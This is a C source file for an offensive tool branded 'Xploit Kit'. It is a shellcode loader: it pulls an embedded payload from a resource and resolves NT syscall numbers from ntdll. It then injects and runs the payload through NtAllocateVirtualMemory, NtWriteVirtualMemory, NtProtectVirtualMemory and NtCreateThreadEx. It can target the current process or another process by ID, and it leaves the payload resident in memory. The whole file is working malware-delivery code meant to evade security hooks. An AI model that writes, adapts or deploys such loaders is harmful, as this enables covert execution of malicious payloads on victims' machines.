/*
--------------------------------------------------------------------------------------------
@Author: Yenn
@website:
--------------------------------------------------------------------------------------------
*/


#include "Inject.h"
#include "resource.h"

// Global syscall numbers
DWORD g_NtOpenProcessSSN;
DWORD g_NtAllocateVirtualMemorySSN;
DWORD g_NtWriteVirtualMemorySSN;
DWORD g_NtProtectVirtualMemorySSN;
DWORD g_NtCreateThreadExSSN;
DWORD g_NtWaitForSingleObjectSSN;
DWORD g_NtFreeVirtualMemorySSN;
DWORD g_NtCloseSSN;

VOID PrintBanner(VOID) {
    printf("\n");
    printf("     ╭──────────────────────────────────────╮\n");
    printf("     │        /\\_/\\      ┌─────────────┐    │\n");
    printf("     │       ( o.o )     │  XPLOITKIT  │    │\n");
    printf("     │        > ^ <      │ Cyber Ninja │    │\n");
    printf("     │        ─────      └─────────────┘    │\n");
    printf("     │                                      │\n");
    printf("     │            [Xploit Kit]              │\n");
    printf("     │         Version: 1.0 [Beta]          │\n");
    printf("     ╰──────────────────────────────────────╯\n");
    printf("       ══════════════════════════════════\n");
    printf("\n");
}

BOOL FetchResource() {
    HRSRC hResource = NULL;
    HGLOBAL hGlobal = NULL;
    PVOID pPayloadAddress = NULL;
    SIZE_T sPayloadSize = 0;

    hResource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    if (hResource == NULL) {
        PRINT_ERROR("[!] Failed to find resource: %d\n", GetLastError());
        return FALSE;
    }

    hGlobal = LoadResource(NULL, hResource);
    if (hGlobal == NULL) {
        PRINT_ERROR("[!] Failed to load resource: %d\n", GetLastError());
        return FALSE;
    }

    pPayloadAddress = LockResource(hGlobal);
    if (pPayloadAddress == NULL) {
        PRINT_ERROR("[!] Failed to lock resource: %d\n", GetLastError());
        return FALSE;
    }
    sPayloadSize = SizeofResource(NULL, hResource);
    if (sPayloadSize == 0) {
        PRINT_ERROR("[!] Failed to get size of resource: %d\n", GetLastError());
        return FALSE;
    }

    OKAY("pPayloadAddress var : 0x%p \n", pPayloadAddress);
    OKAY("sPayload Size var : %ld \n", sPayloadSize);
    OKAY("Press <Enter> to move on with Injection");
    getchar();

    // Use pseudo-handle for current process
    return DirectSyscalls((DWORD)(LONG_PTR)-1, pPayloadAddress, (DWORD)sPayloadSize);
}


VOID SyscallNumber(
    _In_ HMODULE NtdllHandle,
    _In_ LPCSTR NtFunctionName,
    _Out_ PDWORD SyscallNumber
) {
    UINT_PTR FunctionAddress = 0;

	FunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == FunctionAddress) {
		PRINT_ERROR("GetProcAddress failed for %s", NtFunctionName);
		return;
    }

    *SyscallNumber = ((PBYTE)(FunctionAddress + 0x4))[0];
	INFO("[0x%p] [0x%0.31x] -> %s", (PVOID)FunctionAddress, *SyscallNumber, NtFunctionName);
    return;
}

BOOL DirectSyscalls(
    _In_ CONST DWORD PID,
    _In_ CONST PVOID Payloadbuffer,
    _In_ CONST DWORD PayloadSize
) {
    //Global Variables
    HMODULE NtdllHandle = NULL;
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle = NULL;

    PVOID Buffer = NULL;
    BOOL State = TRUE;
    
    DWORD oldProtect = 0;
    SIZE_T bytesWritten = 0;
    SIZE_T PayloadSizeActual = PayloadSize; // Need separate var for size modifications
    NTSTATUS Status = 0;
    CLIENT_ID ClientId = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        PRINT_ERROR("GetModuleHandleW", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] Successfully got address of ntdll.dll", NtdllHandle);

    SyscallNumber(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN);
    SyscallNumber(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
    SyscallNumber(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
    SyscallNumber(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
    SyscallNumber(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
    SyscallNumber(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
    SyscallNumber(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
    SyscallNumber(NtdllHandle, "NtClose", &g_NtCloseSSN);

    // Handle current process case
    if (PID == (DWORD)(LONG_PTR)-1) {
        ProcessHandle = NtCurrentProcess();
        OKAY("Using current process handle");
    } else {
        Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &ClientId);
        if (Status != STATUS_SUCCESS) {
            PRINT_ERROR("NtOpenProcess", Status);
            return FALSE;
        }
    }

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSizeActual, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        return FALSE;
    }

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payloadbuffer, PayloadSize, &bytesWritten);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtWriteVirtualMemory", Status);
        return FALSE;
    }

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSizeActual, PAGE_EXECUTE_READ, &oldProtect);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        return FALSE;
    }

    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, NULL, ProcessHandle, Buffer, NULL, 0, 0, 0, 0, NULL);
    if (Status != STATUS_SUCCESS) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        return FALSE;
    }

    OKAY("[0x%p] created thread in target process", ThreadHandle);
    INFO("[0x%p] Waiting for the thread to finish the execution stage...", ThreadHandle);
    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread execution finished. Payload remains in memory.", ThreadHandle);
    OKAY("[0x%p] payload buffer address (memory persistent)", Buffer);

    // Return success - no cleanup performed
    return TRUE;
}